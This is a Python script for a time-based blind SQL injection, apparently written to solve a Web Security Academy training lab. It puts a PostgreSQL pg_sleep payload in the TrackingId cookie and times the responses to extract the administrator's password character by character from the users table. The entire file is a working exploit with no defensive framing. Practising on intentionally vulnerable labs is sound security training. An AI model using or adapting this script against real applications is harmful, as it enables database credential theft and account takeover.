#!/usr/bin/env python3
import requests
import string
import time

# Target URL
url = 'https://0a3f004404a7e73a81c670fa00d0005d.web-security-academy.net/'

# Character set to brute-force (lowercase + uppercase + digits)
charset = string.ascii_lowercase + string.digits  # or use string.printable for full charset

# Max password length to test
max_length = 20

# Delay threshold to detect pg_sleep hit
DELAY_THRESHOLD = 1.8  # seconds

# Store discovered characters
password = ['_'] * max_length

for position in range(1, max_length + 1):
    found = False
    for char in charset:
        # Build the SQL payload
        payload = f"UeBgTPGPjXHIx4qQ'||CASE WHEN ((SELECT COUNT(username) FROM users WHERE username='administrator' AND SUBSTRING(password, {position}, 1) = '{char}')=1) THEN pg_sleep(2) ELSE pg_sleep(0) END--"

        # Set up the cookie with your injection
        cookies = {
            'TrackingId': payload
        }

        # Measure response time
        start = time.time()
        response = requests.get(url, cookies=cookies)
        elapsed = time.time() - start

        print(f"[{position}] Trying '{char}' -> {elapsed:.2f}s")

        if elapsed >= DELAY_THRESHOLD:
            password[position - 1] = char
            print(f"[+] Found char at pos {position}: {char}")
            print("[*] Password so far: " + "".join(password))
            found = True
            break

    if not found:
        print(f"[!] No match found at position {position} — consider expanding charset or increasing delay")

# Final output
print("\n[✓] Final password: " + "".join(password))
